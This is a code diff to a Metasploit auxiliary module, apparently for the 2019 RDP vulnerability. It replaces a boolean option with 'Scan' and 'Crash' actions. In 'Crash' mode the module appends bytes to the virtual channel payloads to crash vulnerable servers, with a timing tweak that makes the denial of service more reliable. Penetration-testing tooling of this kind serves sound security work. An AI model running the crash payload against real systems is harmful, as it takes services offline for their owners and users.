@@ -32,6 +32,11 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'DisclosureDate' => '2019-05-14',
       'License'        => MSF_LICENSE,
+      "Actions" => [
+        ["Scan", "Description" => "Scan for exploitable targets"],
+        ["Crash", "Description" => "Trigger denial of service vulnerability"],
+      ],
+      "DefaultAction" => "Scan",
       'Notes'          =>
         {
           'Stability' => [ CRASH_SAFE ],
@@ -41,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptBool.new('EXPLOIT_DOS',       [ false, 'Trigger denial of service vulnerability.']),
         OptString.new('RDP_USER',        [ false, 'The username to report during connect, UNSET = random']),
         OptString.new('RDP_CLIENT_NAME', [ false, 'The client computer name to report during connect, UNSET = random', 'rdesktop']),
         OptString.new('RDP_DOMAIN',      [ false, 'The client domain name to report during connect']),
@@ -209,14 +213,14 @@ class MetasploitModule < Msf::Auxiliary
 
     # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
     x86_string = "00000000020000000000000000000000"
-    x86_string += "FF" * 8 if datastore['EXPLOIT_DOS']
+    x86_string += "FF" * 8 if action.name == 'Crash'
     x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
 
     x64_string = "0000000000000000020000000000000000000000000000000000000000000000"
-    x64_string += "FF" * 8 if datastore['EXPLOIT_DOS']
+    x64_string += "FF" * 8 if action.name == 'Crash'
     x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
 
-    if datastore['EXPLOIT_DOS']
+    if action.name == 'Crash'
       vprint_status("Sending denial of service payloads")
     else
       vprint_status("Sending patch check payloads")
@@ -231,7 +235,7 @@ class MetasploitModule < Msf::Auxiliary
       rdp_send(x64_packet)
 
       # A single pass should be sufficient to cause DoS
-      if datastore['EXPLOIT_DOS']
+      if action.name == 'Crash'
         # Sleeping a second before disconnect makes this much more reliable
         sleep(1)
         disconnect
